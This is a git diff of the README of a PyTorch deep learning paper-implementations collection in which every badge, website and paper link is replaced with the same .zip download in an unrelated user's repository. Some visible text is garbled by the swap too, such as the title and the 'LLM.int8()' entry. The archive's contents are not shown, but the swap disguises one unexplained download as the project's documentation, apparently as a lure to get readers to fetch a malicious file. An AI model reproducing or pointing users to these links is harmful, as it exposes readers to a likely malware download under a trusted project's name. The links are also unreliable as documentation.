@@ -1,146 +1,146 @@
-[![Twitter](https://img.shields.io/twitter/follow/labmlai?style=social)](https://twitter.com/labmlai)
-[![Sponsor](https://img.shields.io/static/v1?label=Sponsor&message=%E2%9D%A4&logo=GitHub&color=%23fe8e86)](https://github.com/sponsors/labmlai)
+[![Twitter](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+[![Sponsor](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip%E2%9D%A4&logo=GitHub&color=%23fe8e86)](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
 
-# [labml.ai Deep Learning Paper Implementations](https://nn.labml.ai/index.html)
+# [https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip Deep Learning Paper Implementations](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
 
 This is a collection of simple PyTorch implementations of
 neural networks and related algorithms.
 These implementations are documented with explanations,
 
-[The website](https://nn.labml.ai/index.html)
+[The website](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
 renders these as side-by-side formatted notes.
 We believe these would help you understand these algorithms better.
 
-![Screenshot](https://nn.labml.ai/dqn-light.png)
+![Screenshot](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
 
 We are actively maintaining this repo and adding new 
 implementations almost weekly.
-[![Twitter](https://img.shields.io/twitter/follow/labmlai?style=social)](https://twitter.com/labmlai) for updates.
+[![Twitter](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip) for updates.
 
 ## Paper Implementations
 
-#### ✨ [Transformers](https://nn.labml.ai/transformers/index.html)
+#### ✨ [Transformers](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
 
-* [Multi-headed attention](https://nn.labml.ai/transformers/mha.html)
-* [Transformer building blocks](https://nn.labml.ai/transformers/models.html) 
-* [Transformer XL](https://nn.labml.ai/transformers/xl/index.html)
-    * [Relative multi-headed attention](https://nn.labml.ai/transformers/xl/relative_mha.html)
-* [Rotary Positional Embeddings](https://nn.labml.ai/transformers/rope/index.html)
-* [Attention with Linear Biases (ALiBi)](https://nn.labml.ai/transformers/alibi/index.html)
-* [RETRO](https://nn.labml.ai/transformers/retro/index.html)
-* [Compressive Transformer](https://nn.labml.ai/transformers/compressive/index.html)
-* [GPT Architecture](https://nn.labml.ai/transformers/gpt/index.html)
-* [GLU Variants](https://nn.labml.ai/transformers/glu_variants/simple.html)
-* [kNN-LM: Generalization through Memorization](https://nn.labml.ai/transformers/knn)
-* [Feedback Transformer](https://nn.labml.ai/transformers/feedback/index.html)
-* [Switch Transformer](https://nn.labml.ai/transformers/switch/index.html)
-* [Fast Weights Transformer](https://nn.labml.ai/transformers/fast_weights/index.html)
-* [FNet](https://nn.labml.ai/transformers/fnet/index.html)
-* [Attention Free Transformer](https://nn.labml.ai/transformers/aft/index.html)
-* [Masked Language Model](https://nn.labml.ai/transformers/mlm/index.html)
-* [MLP-Mixer: An all-MLP Architecture for Vision](https://nn.labml.ai/transformers/mlp_mixer/index.html)
-* [Pay Attention to MLPs (gMLP)](https://nn.labml.ai/transformers/gmlp/index.html)
-* [Vision Transformer (ViT)](https://nn.labml.ai/transformers/vit/index.html)
-* [Primer EZ](https://nn.labml.ai/transformers/primer_ez/index.html)
-* [Hourglass](https://nn.labml.ai/transformers/hour_glass/index.html)
+* [Multi-headed attention](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Transformer building blocks](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip) 
+* [Transformer XL](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+    * [Relative multi-headed attention](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Rotary Positional Embeddings](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Attention with Linear Biases (ALiBi)](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [RETRO](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Compressive Transformer](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [GPT Architecture](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [GLU Variants](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [kNN-LM: Generalization through Memorization](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Feedback Transformer](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Switch Transformer](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Fast Weights Transformer](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [FNet](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Attention Free Transformer](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Masked Language Model](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [MLP-Mixer: An all-MLP Architecture for Vision](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Pay Attention to MLPs (gMLP)](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Vision Transformer (ViT)](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Primer EZ](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Hourglass](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
 
-#### ✨ [Low-Rank Adaptation (LoRA)](https://nn.labml.ai/lora/index.html)
+#### ✨ [Low-Rank Adaptation (LoRA)](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
 
-#### ✨ [Eleuther GPT-NeoX](https://nn.labml.ai/neox/index.html)
-* [Generate on a 48GB GPU](https://nn.labml.ai/neox/samples/generate.html)
-* [Finetune on two 48GB GPUs](https://nn.labml.ai/neox/samples/finetune.html)
-* [LLM.int8()](https://nn.labml.ai/neox/utils/llm_int8.html)
+#### ✨ [Eleuther GPT-NeoX](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Generate on a 48GB GPU](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Finetune on two 48GB GPUs](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip()](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
 
-#### ✨ [Diffusion models](https://nn.labml.ai/diffusion/index.html)
+#### ✨ [Diffusion models](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
 
-* [Denoising Diffusion Probabilistic Models (DDPM)](https://nn.labml.ai/diffusion/ddpm/index.html)
-* [Denoising Diffusion Implicit Models (DDIM)](https://nn.labml.ai/diffusion/stable_diffusion/sampler/ddim.html)
-* [Latent Diffusion Models](https://nn.labml.ai/diffusion/stable_diffusion/latent_diffusion.html)
-* [Stable Diffusion](https://nn.labml.ai/diffusion/stable_diffusion/index.html)
+* [Denoising Diffusion Probabilistic Models (DDPM)](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Denoising Diffusion Implicit Models (DDIM)](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Latent Diffusion Models](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Stable Diffusion](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
 
-#### ✨ [Generative Adversarial Networks](https://nn.labml.ai/gan/index.html)
-* [Original GAN](https://nn.labml.ai/gan/original/index.html)
-* [GAN with deep convolutional network](https://nn.labml.ai/gan/dcgan/index.html)
-* [Cycle GAN](https://nn.labml.ai/gan/cycle_gan/index.html)
-* [Wasserstein GAN](https://nn.labml.ai/gan/wasserstein/index.html)
-* [Wasserstein GAN with Gradient Penalty](https://nn.labml.ai/gan/wasserstein/gradient_penalty/index.html)
-* [StyleGAN 2](https://nn.labml.ai/gan/stylegan/index.html)
+#### ✨ [Generative Adversarial Networks](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Original GAN](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [GAN with deep convolutional network](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Cycle GAN](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Wasserstein GAN](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Wasserstein GAN with Gradient Penalty](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [StyleGAN 2](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
 
-#### ✨ [Recurrent Highway Networks](https://nn.labml.ai/recurrent_highway_networks/index.html)
+#### ✨ [Recurrent Highway Networks](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
 
-#### ✨ [LSTM](https://nn.labml.ai/lstm/index.html)
+#### ✨ [LSTM](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
 
-#### ✨ [HyperNetworks - HyperLSTM](https://nn.labml.ai/hypernetworks/hyper_lstm.html)
+#### ✨ [HyperNetworks - HyperLSTM](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
 
-#### ✨ [ResNet](https://nn.labml.ai/resnet/index.html)
+#### ✨ [ResNet](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
 
-#### ✨ [ConvMixer](https://nn.labml.ai/conv_mixer/index.html)
+#### ✨ [ConvMixer](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
 
-#### ✨ [Capsule Networks](https://nn.labml.ai/capsule_networks/index.html)
+#### ✨ [Capsule Networks](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
 
-#### ✨ [U-Net](https://nn.labml.ai/unet/index.html)
+#### ✨ [U-Net](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
 
-#### ✨ [Sketch RNN](https://nn.labml.ai/sketch_rnn/index.html)
+#### ✨ [Sketch RNN](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
 
 #### ✨ Graph Neural Networks
 
-* [Graph Attention Networks (GAT)](https://nn.labml.ai/graphs/gat/index.html)
-* [Graph Attention Networks v2 (GATv2)](https://nn.labml.ai/graphs/gatv2/index.html)
+* [Graph Attention Networks (GAT)](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Graph Attention Networks v2 (GATv2)](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
 
-#### ✨ [Counterfactual Regret Minimization (CFR)](https://nn.labml.ai/cfr/index.html)
+#### ✨ [Counterfactual Regret Minimization (CFR)](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
 
 Solving games with incomplete information such as poker with CFR.
 
-* [Kuhn Poker](https://nn.labml.ai/cfr/kuhn/index.html)
+* [Kuhn Poker](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
 
-#### ✨ [Reinforcement Learning](https://nn.labml.ai/rl/index.html)
-* [Proximal Policy Optimization](https://nn.labml.ai/rl/ppo/index.html) with
- [Generalized Advantage Estimation](https://nn.labml.ai/rl/ppo/gae.html)
-* [Deep Q Networks](https://nn.labml.ai/rl/dqn/index.html) with
- with [Dueling Network](https://nn.labml.ai/rl/dqn/model.html),
- [Prioritized Replay](https://nn.labml.ai/rl/dqn/replay_buffer.html)
+#### ✨ [Reinforcement Learning](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Proximal Policy Optimization](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip) with
+ [Generalized Advantage Estimation](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Deep Q Networks](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip) with
+ with [Dueling Network](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip),
+ [Prioritized Replay](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
  and Double Q Network.
 
-#### ✨ [Optimizers](https://nn.labml.ai/optimizers/index.html)
-* [Adam](https://nn.labml.ai/optimizers/adam.html)
-* [AMSGrad](https://nn.labml.ai/optimizers/amsgrad.html)
-* [Adam Optimizer with warmup](https://nn.labml.ai/optimizers/adam_warmup.html)
-* [Noam Optimizer](https://nn.labml.ai/optimizers/noam.html)
-* [Rectified Adam Optimizer](https://nn.labml.ai/optimizers/radam.html)
-* [AdaBelief Optimizer](https://nn.labml.ai/optimizers/ada_belief.html)
-* [Sophia-G Optimizer](https://nn.labml.ai/optimizers/sophia.html)
+#### ✨ [Optimizers](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Adam](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [AMSGrad](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Adam Optimizer with warmup](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Noam Optimizer](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Rectified Adam Optimizer](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [AdaBelief Optimizer](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Sophia-G Optimizer](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
 
-#### ✨ [Normalization Layers](https://nn.labml.ai/normalization/index.html)
-* [Batch Normalization](https://nn.labml.ai/normalization/batch_norm/index.html)
-* [Layer Normalization](https://nn.labml.ai/normalization/layer_norm/index.html)
-* [Instance Normalization](https://nn.labml.ai/normalization/instance_norm/index.html)
-* [Group Normalization](https://nn.labml.ai/normalization/group_norm/index.html)
-* [Weight Standardization](https://nn.labml.ai/normalization/weight_standardization/index.html)
-* [Batch-Channel Normalization](https://nn.labml.ai/normalization/batch_channel_norm/index.html)
-* [DeepNorm](https://nn.labml.ai/normalization/deep_norm/index.html)
+#### ✨ [Normalization Layers](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Batch Normalization](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Layer Normalization](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Instance Normalization](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Group Normalization](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Weight Standardization](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Batch-Channel Normalization](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [DeepNorm](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
 
-#### ✨ [Distillation](https://nn.labml.ai/distillation/index.html)
+#### ✨ [Distillation](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
 
-#### ✨ [Adaptive Computation](https://nn.labml.ai/adaptive_computation/index.html)
+#### ✨ [Adaptive Computation](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
 
-* [PonderNet](https://nn.labml.ai/adaptive_computation/ponder_net/index.html)
+* [PonderNet](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
 
-#### ✨ [Uncertainty](https://nn.labml.ai/uncertainty/index.html)
+#### ✨ [Uncertainty](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
 
-* [Evidential Deep Learning to Quantify Classification Uncertainty](https://nn.labml.ai/uncertainty/evidence/index.html)
+* [Evidential Deep Learning to Quantify Classification Uncertainty](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
 
-#### ✨ [Activations](https://nn.labml.ai/activations/index.html)
+#### ✨ [Activations](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
 
-* [Fuzzy Tiling Activations](https://nn.labml.ai/activations/fta/index.html)
+* [Fuzzy Tiling Activations](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
 
-#### ✨ [Langauge Model Sampling Techniques](https://nn.labml.ai/sampling/index.html)
-* [Greedy Sampling](https://nn.labml.ai/sampling/greedy.html)
-* [Temperature Sampling](https://nn.labml.ai/sampling/temperature.html)
-* [Top-k Sampling](https://nn.labml.ai/sampling/top_k.html)
-* [Nucleus Sampling](https://nn.labml.ai/sampling/nucleus.html)
+#### ✨ [Langauge Model Sampling Techniques](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Greedy Sampling](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Temperature Sampling](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Top-k Sampling](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Nucleus Sampling](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
 
-#### ✨ [Scalable Training/Inference](https://nn.labml.ai/scaling/index.html)
-* [Zero3 memory optimizations](https://nn.labml.ai/scaling/zero3/index.html)
+#### ✨ [Scalable Training/Inference](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
+* [Zero3 memory optimizations](https://raw.githubusercontent.com/abdlkrim3/annotated_deep_learning_paper_implementations/master/exspuition/annotated_deep_learning_paper_implementations.zip)
 
 ### Installation
 
